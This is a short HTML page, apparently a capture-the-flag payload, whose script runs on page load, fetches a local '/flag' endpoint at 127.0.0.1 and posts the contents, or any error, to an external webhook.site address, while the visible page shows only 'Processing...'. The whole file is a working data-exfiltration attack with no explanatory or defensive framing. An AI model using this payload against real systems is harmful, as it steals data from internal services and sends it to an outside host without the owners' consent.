<!DOCTYPE html>
<html>
<head>
    <script>
        // Automatically fetch `/flag` and send the result to your webhook
        fetch("http://127.0.0.1/flag")
            .then(response => response.text())
            .then(flag => {
                // Forward the flag content to your webhook
                fetch("https://webhook.site/cc42d0c8-c60f-4f93-a8fa-8e2b4bd6c5e5", {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: "flag=" + encodeURIComponent(flag)
                });
            })
            .catch(err => {
                // Log any errors to your webhook
                fetch("https://webhook.site/cc42d0c8-c60f-4f93-a8fa-8e2b4bd6c5e5", {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: "error=" + encodeURIComponent(err.message)
                });
            });
    </script>
</head>
<body>
    <h1>Processing...</h1>
</body>
</html>
